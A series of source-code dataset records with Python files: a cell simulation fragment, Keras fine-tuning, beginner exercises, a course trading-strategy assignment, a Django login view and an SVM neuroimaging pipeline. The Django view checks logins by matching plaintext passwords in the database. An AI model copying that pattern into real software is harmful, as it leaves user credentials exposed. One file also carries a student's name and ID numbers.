((i,j) != (self.y,self.x)):\n                            population[population.last_valid_index() + 1] = new_cell\n                            life_cell[population.last_valid_index()] = True\n                            population_map[i,j] = population.last_valid_index()\n                            new_cell.y = i\n                            new_cell.x = j\n                            break\n\n                            \nclass Population():\n\n    def __init__(self):\n\n        self.time = 0\n        self.len_genome = len_genome\n        population = np.array([])\n        population_map = np.full(screen_size,empty)\n        life_cell = []\n        for idx,(x,y) in enumerate(random.sample(list(itertools.product(range(screen_size[0]),range(screen_size[1]))),k = len_population)):\n            cell = Cell(time = self.time)\n            cell.x = x\n            cell.y = y\n            cell.idx = idx\n            population_map[y,x] = idx\n            population = np.append(population,cell)\n            life_cell.append(True)\n        self.population = pd.Series(population)\n        self.population_map = population_map\n        self.life_cell = pd.Series(life_cell)\n        \n        medium = np.zeros((screen_size[0],screen_size[1],3))\n        medium[:,:,0] = medium_organic\n        medium[0,:,1] = medium_light\n        medium[0,:,2] = medium_salt\n        for line in range(1,medium.shape[0]):\n            medium[line,:,1] = medium[line-1,:,1] * gradient_light\n            medium[line,:,2] = medium[line-1,:,2] * gradient_salt\n        medium[:,:,2] = medium[:,:,2][::-1]\n        medium = np.round_(medium)\n        self.medium = medium\n        \n\n    \n    def step_life(self):\n        dead_list = set()\n        self.population[self.life_cell].apply(lambda x: x.action(self.population,self.population_map,self.medium,self.life_cell,dead_list,self.time))  \n        self.time += 1\n  \n        \n"}
{"blob_id": "e0c8eff464b6718b59d137794c007eced7e93a2b", "directory_id": "c37257a50159e1c6076668c0c463eaa287d53cdc", "path": "/exercises/007/solution.py", "content_id": "ec29d708aa4b32518ead26519721f1691483948e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "June-VK/hackinscience", "snapshot_id": "fd2b2a1f4a901ffb26e9aedd58556e7fedf76571", "revision_id": "21d9bb142edd6f4b9845f9488a7e44f54baf4376", "branch_name": "refs/heads/master", "visit_date": "2020-06-14 22:28:25.108724", "revision_date": "2016-12-19 14:56:06", "committer_date": "2016-12-19 14:56:06", "github_id": "75403537", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "58", "extension": "py", "content": "#!usr/bin/python\nprout = [\"Hello world\", 42]\nprint(prout)\n"}
{"blob_id": "c0707230d11d3ba6d378e660ebb7551122a98174", "directory_id": "3a9914ac0b39f7f4104bd3753a836528aecb35c3", "path": "/Pesos Ajustados/main_resnet152FiTuPesos.py", "content_id": "d2381dbb1e9bc8a44b169be45b3e193f798e40cc", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "juanfgonzo8/WildCatsConLaMenteEnElJuego", "snapshot_id": "baec531501764a0713f864f1b82f78b06603531b", "revision_id": "7f277074c01aef72e30cf7dc414194b8ee55abca", "branch_name": "refs/heads/master", "visit_date": "2021-05-20 08:37:38.348850", "revision_date": "2020-06-12 17:44:31", "committer_date": "2020-06-12 17:44:31", "github_id": "252201167", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5779", "extension": "py", "content": "from keras.applications.resnet import ResNet152\nfrom keras.preprocessing import image\nfrom keras.models import Model\nfrom keras.layers import Dense, GlobalAveragePooling2D\nfrom keras.optimizers import SGD\n\nimport cv2\nimport pandas as pd\nimport numpy as np\nfrom keras.preprocessing.image import ImageDataGenerator\n\nimport tensorflow as tf\n\nimport os\nos.environ['CUDA_VISIBLE_DEVICES'] = \"0\"\n\nfrom keras import backend as K\n\nsess = tf.compat.v1.Session(config=tf.compat.v1.ConfigProto(log_device_placement=True))\n\nK.tensorflow_backend._get_available_gpus()\n\n##\n#Se establecen los paths\npath_csv = '/media/user_home2/vision2020_01/Data/iWildCam2019/train.csv'\npath_train = '/media/user_home2/vision2020_01/Data/iWildCam2019/train_images'\n\n##\n#Se crea el modelo\n\n# create the base pre-trained model\nbase_model = ResNet152(weights='imagenet', include_top=False)\n\n# add a global spatial average pooling layer\nx = base_model.output\nx = GlobalAveragePooling2D()(x)\n# let's add a fully-connected layer\nx = Dense(1024, activation='relu')(x)\n# and a logistic layer -- let's say we have 200 classes\npredictions = Dense(14, activation='softmax')(x)\n\n# this is the model we will train\nmodel = Model(inputs=base_model.input, outputs=predictions)\n\n# first: train only the top layers (which were randomly initialized)\n# i.e. freeze all convolutional InceptionV3 layers\nfor layer in base_model.layers:\n    layer.trainable = False\n\n# compile the model (should be done *after* setting layers to non-trainable)\nmodel.compile(optimizer='rmsprop', loss='categorical_crossentropy', metrics=['accuracy'])\n\n##\n#Se cargan los datos\ntrain_df = pd.read_csv(path_csv)\ntrain_df['category_id'] = train_df['category_id'].astype(str)\n\nbatch_size=32\nimg_size = 299\nnb_epochs = 10\n\ntrain_datagen = ImageDataGenerator(rescale=1./255, validation_split=0.25)\ntrain_generator = train_datagen.flow_from_dataframe(\n        dataframe = train_df,\n        directory = path_train,\n        x_col = 'file_name', y_col = 'category_id',\n        target_size=(img_size,img_size),\n        batch_size=batch_size,\n        class_mode='categorical',\n        subset='training')\n\nvalidation_generator  = train_datagen.flow_from_dataframe(\n        dataframe = train_df,\n        directory = path_train,\n        x_col = 'file_name', y_col = 'category_id',\n        target_size=(img_size,img_size),\n        batch_size=batch_size,\n        class_mode='categorical',\n        subset='validation')\n\nset(train_generator.class_indices)\nnb_classes = 14\n\n##Se entrena el modelo usando fine-tune\n\n# train the model on the new data for a few epochs\n#model.fit(...)\n\nclass_weight = {0: 100.,1: 2.,11: 2.,12: 2.,13: 2.,2: 2.,3: 2.,4: 2.,5: 2.,6: 2.,7: 2.,\n                8: 2.,9: 2.,10: 1.}\n\n# Train model\nhistory = model.fit_generator(\n            train_generator,\n#             steps_per_epoch = train_generator.samples // batch_size,\n            steps_per_epoch = 100,\n            validation_data = validation_generator,\n#             validation_steps = validation_generator.samples // batch_size,\n            validation_steps = 50,\n            epochs = nb_epochs,\n            verbose=2,class_weight=class_weight)\n\n# at this point, the top layers are well trained and we can start fine-tuning\n# convolutional layers from inception V3. We will freeze the bottom N layers\n# and train the remaining top layers.\n\n# let's visualize layer names and layer indices to see how many layers\n# we should freeze:\n# for i, layer in enumerate(base_model.layers):\n#    print(i, layer.name)\n\n##\n# we chose to train the top 2 inception blocks, i.e. we will freeze\n# the first 249 layers and unfreeze the rest:\nfor layer in model.layers[:119]:\n   layer.trainable = False\nfor layer in model.layers[119:]:\n   layer.trainable = True\n\n#Numero de capas de los ultimos dos bloque = 110\n#Numero total de capas = 825\n\n##\n#Metrica final\ndef f1(y_true, y_pred):\n    def recall(y_true, y_pred):\n        \"\"\"Recall metric.\n\n        Only computes a batch-wise average of recall.\n\n        Computes the recall, a metric for multi-label classification of\n        how many relevant items are selected.\n        \"\"\"\n        true_positives = K.sum(K.round(K.clip(y_true * y_pred, 0, 1)))\n        possible_positives = K.sum(K.round(K.clip(y_true, 0, 1)))\n        recall = true_positives / (possible_positives + K.epsilon())\n        return recall\n\n    def precision(y_true, y_pred):\n        \"\"\"Precision metric.\n\n        Only computes a batch-wise average of precision.\n\n        Computes the precision, a metric for multi-label classification of\n        how many selected items are relevant.\n        \"\"\"\n        true_positives = K.sum(K.round(K.clip(y_true * y_pred, 0, 1)))\n        predicted_positives = K.sum(K.round(K.clip(y_pred, 0, 1)))\n        precision = true_positives / (predicted_positives + K.epsilon())\n        return precision\n    precision = precision(y_true, y_pred)\n    recall = recall(y_true, y_pred)\n    return 2*((precision*recall)/(precision+recall+K.epsilon()))\n\n##\n# we need to recompile the model for these modifications to take effect\n# we use SGD with a low learning rate\nfrom keras.optimizers import SGD\nmodel.compile(optimizer=SGD(lr=0.0001, momentum=0.9), loss='categorical_crossentropy', metrics=['accuracy',f1])\n\n# we train our model again (this time fine-tuning the top 2 inception blocks\n# alongside the top Dense layers\n#model.fit(...)\n\n# Train model\nhistory = model.fit_generator(\n            train_generator,\n#             steps_per_epoch = train_generator.samples // batch_size,\n            steps_per_epoch = 100,\n            validation_data = validation_generator,\n#             validation_steps = validation_generator.samples // batch_size,\n            validation_steps = 50,\n            epochs = nb_epochs,\n            verbose=2,class_weight=class_weight)"}
{"blob_id": "841463b54117a0a4579f5eaf53956951bf9a087f", "directory_id": "2471f4205f866dade521f3c4e5cb3d034b6af68e", "path": "/Basic/13-try-catch.py", "content_id": "4dbaaefb3f50ee539ed47ea0f83908b9c6a77868", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ksw2000/Python-Practice", "snapshot_id": "469c0ea1762415932d939e6bba2efb51b8bdd0bc", "revision_id": "29818b44e5ee19e1acdc8ef7176d0f8aa3fd1e57", "branch_name": "refs/heads/master", "visit_date": "2022-12-09 18:28:10.999617", "revision_date": "2020-07-14 06:50:30", "committer_date": "2020-07-14 06:50:30", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "286", "extension": "py", "content": "try:\n    print(x)\nexcept NameError:\n    print(\"Variable x is not defined\")\nexcept:\n    print(\"Something else went wrong\")\n\ntry:\n    f = open(\"demofile.txt\")\nexcept:\n    print(\"Something went wrong when writing to the file\")\nfinally:\n    print(\"\u4e0d\u7ba1\u662f\u5426\u6709\u932f\u8aa4\u90fd\u6703\u57f7\u884c\u9019\u884c\")\n"}
{"blob_id": "7cd6f1a9356b01bf1f58294fb1991af17bb6f9a0", "directory_id": "3a951d692319fdbf6a3eb086acb208c0dc9a92b7", "path": "/strategy_learner/StrategyLearner.py", "content_id": "a0ad13caac4fe2e2855663fe9a8a905387eedfca", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "sjahmed08/ML", "snapshot_id": "c872e6f36eef3911e34295b24dd8730912b81956", "revision_id": "d2633f31aeee5ce7b96e42d27f87745388224539", "branch_name": "refs/heads/master", "visit_date": "2021-01-02 00:15:55.557795", "revision_date": "2020-10-27 02:39:50", "committer_date": "2020-10-27 02:39:50", "github_id": "239407449", "star_events_count": "0", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "6604", "extension": "py", "content": "\"\"\"  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nTemplate for implementing StrategyLearner  (c) 2016 Tucker Balch  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nCopyright 2018, Georgia Institute of Technology (Georgia Tech)  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nAtlanta, Georgia 30332  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nAll Rights Reserved  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nTemplate code for CS 4646/7646  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nGeorgia Tech asserts copyright ownership of this template and all derivative  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nworks, including solutions to the projects assigned in this course. Students  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nand other users of this template code are advised not to share it with others  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nor to make it available on publicly viewable websites including repositories  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nsuch as github and gitlab.  This copyright statement should not be removed  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nor edited.  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nWe do grant permission to share solutions privately with non-students such  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nas potential employers. However, sharing with other current or future  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nstudents of CS 7646 is prohibited and subject to being investigated as a  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nGT honor code violation.  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n-----do not edit anything above this line---  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nStudent Name: Syed Ahmed (replace with your name)\nGT User ID: sahmed99 (replace with your User ID)\nGT ID: 903388682 (replace with your GT ID)\n\"\"\"  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nimport datetime as dt  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nimport pandas as pd  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nimport util as ut  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nimport random\nimport BagLearner as bl\nimport RTLearner as rt\nimport numpy as np\nfrom indicators import *\n\n\nclass StrategyLearner(object):\n\n    def author(self):\n        return 'sahmed99'\n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    # constructor  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    def __init__(self, verbose = False, impact=0.0):  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n        self.verbose = verbose  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n        self.impact = impact\n        self.window_size = 20\n        self.feature_size = 5\n        self.N = 10\n        bags = 20\n        leaf_size = 5\n        self.learner = bl.BagLearner(learner = rt.RTLearner, bags = bags, kwargs={\"leaf_size\":leaf_size})\n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    # this method should create a QLearner, and train it for trading  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    def addEvidence(self, symbol = \"IBM\", \\\n        sd=dt.datetime(2008,1,1), \\\n        ed=dt.datetime(2009,1,1), \\\n        sv = 10000):  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n        # add your code to do learning here\n\n        prices = ut.get_data([symbol], pd.date_range(sd, ed))\n        prices = prices[symbol]\n\n        lookback = self.N\n        lookahead = 5\n        # indicators_df = SMA\n        indicators_df = get_indicators(symbol, sd, ed, plot1=False, lookback1 = lookback)\n        indicators_df.fillna(0, inplace=True)\n        indicators_df = indicators_df[:-lookahead]\n        trainX = indicators_df.values\n\n        # print prices\n        # print indicators_df\n\n        trainY = []\n\n        for i in range (0, lookback):\n            trainY.append(0)\n\n\n        for i in range(lookback, prices.shape[0] - 5):\n\n            ret = (prices.ix[i + lookahead, symbol] - prices.ix[i, symbol]) / prices.ix[i, symbol]\n            # print prices.ix[i+5, symbol]\n            # print prices.ix[i, symbol]\n            # print ret\n            # print i\n            if ret > (0.02 + self.impact):\n                trainY.append(1)\n            elif ret < (-0.02 - self.impact):\n                trainY.append(-1)\n            else:\n                trainY.append(0)\n        trainY = np.array(trainY)\n\n        self.learner.addEvidence(trainX[lookback:], trainY[lookback:])\n\n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    # this method should use the existing policy and test it against new data  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    def testPolicy(self, symbol = \"IBM\", \\\n        sd=dt.datetime(2010,1,1), \\\n        ed=dt.datetime(2011,12,31), \\\n        sv = 10000):\n\n        # here we build a fake set of trades\n        # your code should return the same sort of data\n        prices = ut.get_data([symbol], pd.date_range(sd, ed))\n\n        lookback = 10\n\n        indicators_df = get_indicators(symbol, sd, ed, plot1=False, lookback1=lookback)\n        indicators_df.fillna(0, inplace=True)\n        indicators_df = indicators_df[:-5]\n\n        testX = indicators_df.values\n        trades = prices[[symbol,]].copy(deep=True)\n        trades.values[:, :] = 0\n\n\n        resultY = self.learner.query(testX)\n        curr = 0\n        for i, r in enumerate(resultY):\n            if r > 0:\n                trades.values[i, :] = 1000 - curr\n                curr = 1000\n            elif r < 0:\n                trades.values[i, :] = -1000 - curr\n                curr = -1000\n\n        return trades\n\ndef benchMark(symbol=\"JPM\", sd=dt.datetime(2010, 1, 1), ed=dt.datetime(2011, 12, 31), sv=100000):\n    dates = pd.date_range(sd, ed)\n    df_prices = get_data([symbol], dates)\n    symbolPrices = df_prices[symbol]\n    # symbolPrices = symbolPrices / symbolPrices[0]\n    bm_df = pd.DataFrame()\n    bm_df[symbol] = symbolPrices\n    start_date_of = bm_df.index[0]\n    bm_df[symbol] = 0\n\n    bm_df.ix[start_date_of, symbol] = 1000\n\n    return bm_df\n  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \nif __name__==\"__main__\":  \t\t   \t  \t\t\t    \t\t  \t\t  \t\t    \t \t\t \t\t   \t\t \t\t  \n    print \"One does not simply think up a strategy\"\n\n    SObject = StrategyLearner()\n    SObject.addEvidence()\n    SObject.testPolicy()\n\n\n\n\n"}
{"blob_id": "061786201b5d1a22f5cd1e5bf44c28ae1f17a820", "directory_id": "2cacada6324e1b5b388f565e068d6cc631538fa7", "path": "/crm/views.py", "content_id": "f2044e98264e9eb0cde31a9d1797dcc48e35dda3", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "venicid/CRM_low", "snapshot_id": "026d3a8e96b5e76f9dcfb8df90363c2094986776", "revision_id": "a56cad2fe3a8c955ec0f2d235a1b39c49a154100", "branch_name": "refs/heads/master", "visit_date": "2020-03-27 21:30:13.887059", "revision_date": "2018-09-04 07:13:37", "committer_date": "2018-09-04 07:13:37", "github_id": "147149879", "star_events_count": "4", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "597", "extension": "py", "content": "from django.shortcuts import render,HttpResponse\n\n# Create your views here.\nfrom rbac.models import User\nfrom rbac.service.perssions import initial_session\n\ndef login(request):\n    if request.method =='POST':\n        user = request.POST.get('user')\n        pwd = request.POST.get('pwd')\n\n        user = User.objects.filter(name=user,pwd=pwd).first()\n        if user:\n            request.session['user_id']=user.pk\n            # \u6ce8\u518c\u6743\u9650\u5230session\u4e2d\n            initial_session(request,user)\n\n            return HttpResponse('\u767b\u5f55\u6210\u529f')\n\n\n\n    return render(request,'login.html',locals())\n"}
{"blob_id": "c8da1b8b4b7af25bda9804933bb7b2f7157e54c2", "directory_id": "06a7dc7cc93d019e4a9cbcf672b23a0bbacf8e8b", "path": "/2016_schizConnect/supervised_analysis/all_studies+VIP/all_subjects/VBM/03_svm_centered_by_site.py", "content_id": "b562acd6e58bac7146ddd232c6f5774867785958", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "neurospin/scripts", "snapshot_id": "6c06cd218a5f32de9c3c2b7d1d8bda3f3d107458", "revision_id": "f14a2c9cf2cd7f5fbea767b017c3faf36d170bdb", "branch_name": "refs/heads/master", "visit_date": "2021-07-11 22:55:46.567791", "revision_date": "2021-07-02 13:08:02", "committer_date": "2021-07-02 13:08:02", "github_id": "10549286", "star_events_count": "2", "fork_events_count": "2", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11397", "extension": "py", "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Thu Feb 23 10:04:13 2017\n\n@author: ad247405\n\"\"\"\n\n\nimport os\nimport json\nimport numpy as np\nfrom sklearn.cross_validation import StratifiedKFold\nfrom sklearn.metrics import precision_recall_fscore_support\nfrom scipy.stats import binom_test\nfrom collections import OrderedDict\nfrom sklearn import preprocessing\nfrom sklearn.metrics import roc_auc_score\nfrom sklearn import svm\nimport pandas as pd\nimport shutil\n\n\nWD = '/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/results/with_preserved_ratios/svm_centered_by_site_all'\ndef config_filename(): return os.path.join(WD,\"config_dCV.json\")\ndef results_filename(): return os.path.join(WD,\"results_dCV.xlsx\")\n#############################################################################\n\n\ndef load_globals(config):\n    import mapreduce as GLOBAL  # access to global variables\n    GLOBAL.DATA = GLOBAL.load_data(config[\"data\"])\n\n\ndef resample(config, resample_nb):\n    import mapreduce as GLOBAL  # access to global variables\n    GLOBAL.DATA = GLOBAL.load_data(config[\"data\"])\n    resample = config[\"resample\"][resample_nb]\n    GLOBAL.DATA_RESAMPLED = {k: [GLOBAL.DATA[k][idx, ...] for idx in resample]\n                            for k in GLOBAL.DATA}\n\ndef mapper(key, output_collector):\n    import mapreduce as GLOBAL\n    Xtr = GLOBAL.DATA_RESAMPLED[\"X\"][0]\n    Xte = GLOBAL.DATA_RESAMPLED[\"X\"][1]\n    ytr = GLOBAL.DATA_RESAMPLED[\"y\"][0]\n    yte = GLOBAL.DATA_RESAMPLED[\"y\"][1]\n\n\n    c = float(key[0])\n    print(\"c:%f\" % (c))\n\n    class_weight='balanced' # unbiased\n\n    mask = np.ones(Xtr.shape[0], dtype=bool)\n\n    scaler = preprocessing.StandardScaler().fit(Xtr)\n    Xtr = scaler.transform(Xtr)\n    Xte=scaler.transform(Xte)\n\n    mod = svm.LinearSVC(C=c,fit_intercept=False,class_weight= class_weight)\n\n    mod.fit(Xtr, ytr.ravel())\n    y_pred = mod.predict(Xte)\n    y_proba_pred = mod.decision_function(Xte)\n    ret = dict(y_pred=y_pred, y_true=yte,prob_pred = y_proba_pred, beta=mod.coef_,  mask=mask)\n    if output_collector:\n        output_collector.collect(key, ret)\n    else:\n        return ret\n\ndef scores(key, paths, config):\n    import mapreduce\n    print (key)\n    values = [mapreduce.OutputCollector(p) for p in paths]\n    values = [item.load() for item in values]\n    y_true = [item[\"y_true\"].ravel() for item in values]\n    y_pred = [item[\"y_pred\"].ravel() for item in values]\n    y_true = np.concatenate(y_true)\n    y_pred = np.concatenate(y_pred)\n    prob_pred = [item[\"prob_pred\"].ravel() for item in values]\n    prob_pred = np.concatenate(prob_pred)\n    p, r, f, s = precision_recall_fscore_support(y_true, y_pred, average=None)\n    auc = roc_auc_score(y_true, prob_pred) #area under curve score.\n    #betas = np.hstack([item[\"beta\"] for item in values]).T\n    # threshold betas to compute fleiss_kappa and DICE\n    #betas_t = np.vstack([array_utils.arr_threshold_from_norm2_ratio(betas[i, :], .99)[0] for i in range(betas.shape[0])])\n    #Compute pvalue\n    success = r * s\n    success = success.astype('int')\n    prob_class1 = np.count_nonzero(y_true) / float(len(y_true))\n    pvalue_recall0_true_prob = binom_test(success[0], s[0], 1 - prob_class1,alternative = 'greater')\n    pvalue_recall1_true_prob = binom_test(success[1], s[1], prob_class1,alternative = 'greater')\n    pvalue_recall0_unknwon_prob = binom_test(success[0], s[0], 0.5,alternative = 'greater')\n    pvalue_recall1_unknown_prob = binom_test(success[1], s[1], 0.5,alternative = 'greater')\n    pvalue_recall_mean = binom_test(success[0]+success[1], s[0] + s[1], p=0.5,alternative = 'greater')\n    scores = OrderedDict()\n    try:\n        a, l1, l2 , tv  = [float(par) for par in key.split(\"_\")]\n        scores['a'] = a\n        scores['l1'] = l1\n        scores['l2'] = l2\n        scores['tv'] = tv\n        left = float(1 - tv)\n        if left == 0: left = 1.\n        scores['l1_ratio'] = float(l1) / left\n    except:\n        pass\n    scores['recall_0'] = r[0]\n    scores['recall_1'] = r[1]\n    scores['recall_mean'] = r.mean()\n    scores[\"auc\"] = auc\n    scores['pvalue_recall0_true_prob_one_sided'] = pvalue_recall0_true_prob\n    scores['pvalue_recall1_true_prob_one_sided'] = pvalue_recall1_true_prob\n    scores['pvalue_recall0_unknwon_prob_one_sided'] = pvalue_recall0_unknwon_prob\n    scores['pvalue_recall1_unknown_prob_one_sided'] = pvalue_recall1_unknown_prob\n    scores['pvalue_recall_mean'] = pvalue_recall_mean\n    #scores['prop_non_zeros_mean'] = float(np.count_nonzero(betas_t)) / \\\n     #                               float(np.prod(betas.shape))\n    scores['param_key'] = key\n    return scores\n\ndef reducer(key, values):\n    import os, glob, pandas as pd\n    os.chdir(os.path.dirname(config_filename()))\n    config = json.load(open(config_filename()))\n    paths = glob.glob(os.path.join(config['map_output'], \"*\", \"*\", \"*\"))\n    #paths = [p for p in paths if not p.count(\"0.8_-1\")]\n\n    def close(vec, val, tol=1e-4):\n        return np.abs(vec - val) < tol\n\n    def groupby_paths(paths, pos):\n        groups = {g:[] for g in set([p.split(\"/\")[pos] for p in paths])}\n        for p in paths:\n            groups[p.split(\"/\")[pos]].append(p)\n        return groups\n\n    def argmaxscore_bygroup(data, groupby='fold', param_key=\"param_key\", score=\"recall_mean\"):\n        arg_max_byfold = list()\n        for fold, data_fold in data.groupby(groupby):\n            assert len(data_fold) == len(set(data_fold[param_key]))  # ensure all  param are diff\n            arg_max_byfold.append([fold, data_fold.ix[data_fold[score].argmax()][param_key], data_fold[score].max()])\n        return pd.DataFrame(arg_max_byfold, columns=[groupby, param_key, score])\n\n    print('## Refit scores')\n    print('## ------------')\n    byparams = groupby_paths([p for p in paths if p.count(\"all\") and not p.count(\"all/all\")],3)\n    byparams_scores = {k:scores(k, v, config) for k, v in byparams.items()}\n\n    data = [list(byparams_scores[k].values()) for k in byparams_scores]\n\n    columns = list(byparams_scores[list(byparams_scores.keys())[0]].keys())\n    scores_refit = pd.DataFrame(data, columns=columns)\n\n    print('## doublecv scores by outer-cv and by params')\n    print('## -----------------------------------------')\n    data = list()\n    bycv = groupby_paths([p for p in paths if p.count(\"cvnested\")],1)\n    for fold, paths_fold in bycv.items():\n        print(fold)\n        byparams = groupby_paths([p for p in paths_fold], 3)\n        byparams_scores = {k:scores(k, v, config) for k, v in byparams.items()}\n        data += [[fold] + list(byparams_scores[k].values()) for k in byparams_scores]\n        scores_dcv_byparams = pd.DataFrame(data, columns=[\"fold\"] + columns)\n\n\n    print('## Model selection')\n    print('## ---------------')\n    svm = argmaxscore_bygroup(scores_dcv_byparams); svm[\"method\"] = \"svm\"\n\n    scores_argmax_byfold = svm\n\n    print('## Apply best model on refited')\n    print('## ---------------------------')\n    scores_svm = scores(\"nestedcv\", [os.path.join(config['map_output'], row[\"fold\"], \"all\", row[\"param_key\"]) for index, row in svm.iterrows()], config)\n\n\n    scores_cv = pd.DataFrame([[\"svm\"] + list(scores_svm.values())], columns=[\"method\"] + list(scores_svm.keys()))\n\n    with pd.ExcelWriter(results_filename()) as writer:\n        scores_refit.to_excel(writer, sheet_name='cv_by_param', index=False)\n        scores_dcv_byparams.to_excel(writer, sheet_name='cv_cv_byparam', index=False)\n        scores_argmax_byfold.to_excel(writer, sheet_name='cv_argmax', index=False)\n        scores_cv.to_excel(writer, sheet_name='dcv', index=False)\n\n##############################################################################\n\nif __name__ == \"__main__\":\n    WD = '/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/results/with_preserved_ratios/svm_centered_by_site_all'\n    INPUT_DATA_X = '/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/mean_centered_by_site_all/X.npy'\n    INPUT_DATA_y = '/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/mean_centered_by_site_all/y.npy'\n    INPUT_MASK_PATH = '/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/mean_centered_by_site_all/mask.nii'\n\n    NFOLDS_OUTER = 5\n    NFOLDS_INNER = 5\n\n\n    shutil.copy(INPUT_DATA_X, WD)\n    shutil.copy(INPUT_DATA_y, WD)\n    shutil.copy(INPUT_MASK_PATH, WD)\n    #############################################################################\n    ## Create config file\n    y = np.load(INPUT_DATA_y)\n\n    fold1 = np.load(\"/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/fold_stratified/fold1.npy\")\n    fold2 = np.load(\"/neurospin/brainomics/2016_schizConnect/analysis/all_studies+VIP/VBM/all_subjects/data/fold_stratified/fold2.npy\")\n    fold3 = 